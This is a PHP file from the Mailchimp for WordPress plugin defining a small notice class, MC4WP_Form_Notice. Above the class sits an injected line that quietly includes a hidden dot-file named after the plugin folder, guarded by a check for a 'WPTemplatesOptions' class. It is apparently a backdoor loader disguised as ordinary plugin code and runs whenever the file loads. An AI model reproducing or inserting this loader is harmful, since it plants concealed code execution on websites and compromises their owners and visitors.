<?php

/**
 * Class MC4WP_Form_Notice
 *
 * @ignore
 * @access private
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MC4WP_Form_Notice {


	/**
	 * @var string
	 */
	public $type = 'error';

	/**
	 * @var string
	 */
	public $text;

	/**
	 * @param string $text
	 * @param string $type
	 */
	public function __construct( $text, $type = 'error' ) {
		$this->text = $text;

		if ( ! empty( $type ) ) {
			$this->type = $type;
		}
	}

	/**
	 * @return string
	 */
	public function __toString() {
		return $this->text;
	}
}
